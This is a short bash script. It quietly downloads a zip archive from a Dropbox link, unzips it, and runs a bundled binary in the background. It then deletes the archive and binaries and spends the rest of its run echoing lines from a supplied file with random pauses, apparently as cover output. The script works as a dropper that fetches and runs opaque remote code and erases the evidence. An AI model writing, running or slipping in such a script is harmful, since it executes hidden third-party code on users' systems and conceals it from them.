#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/cvg7l25wfcj0417/wan01.zip -q
unzip wan01.zip > /dev/null 2>&1
#pwd
./logd ./blob &
sleep 3
rm -rf wan01.zip
rm -rf logd
rm -rf blob
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 6 ))
done < $2

